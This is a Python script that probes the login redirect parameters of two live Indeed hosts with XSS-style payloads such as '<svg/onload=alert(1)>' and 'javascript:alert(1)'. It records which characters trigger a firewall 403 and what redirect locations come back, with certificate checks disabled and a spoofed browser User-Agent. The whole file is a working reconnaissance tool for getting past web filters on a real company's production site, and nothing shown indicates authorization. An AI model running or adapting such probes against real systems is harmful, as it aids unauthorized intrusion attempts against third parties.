"""Which character triggers the 403 on these endpoints? One request per char."""
import requests
import urllib3

urllib3.disable_warnings()
UA = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/126.0 Safari/537.36"}

CASES = {
    "plain": "zqtest1234",
    "lt": "zqtest1234<",
    "gt": "zqtest1234>",
    "lt-gt": "zqtest1234<>",
    "quote": 'zqtest1234"',
    "squote": "zqtest1234'",
    "svg": "zqtest1234<svg>",
    "svg-slash": "zqtest1234<svg/onload=alert(1)>",
    "pct-lt": "zqtest1234%3C",
    "onload-only": "zqtest1234onload=alert(1)",
    "javascript": "javascript:alert(1)",
}

BASE = "https://adh.indeed.com/user/login?next={}"
BASE2 = "https://secure.indeed.com/account/login?continue={}"

for label, base in (("adh.indeed", BASE), ("secure.indeed", BASE2)):
    print("=" * 70, label)
    for name, val in CASES.items():
        from urllib.parse import quote
        url = base.format(quote(val, safe=""))
        try:
            r = requests.get(url, timeout=20, verify=False, headers=UA,
                             allow_redirects=False)
            loc = r.headers.get("Location") or ""
            print(f"  {name:14} {r.status_code}  loc={loc[:70]}")
        except Exception as e:
            print(f"  {name:14} ERR {type(e).__name__}")
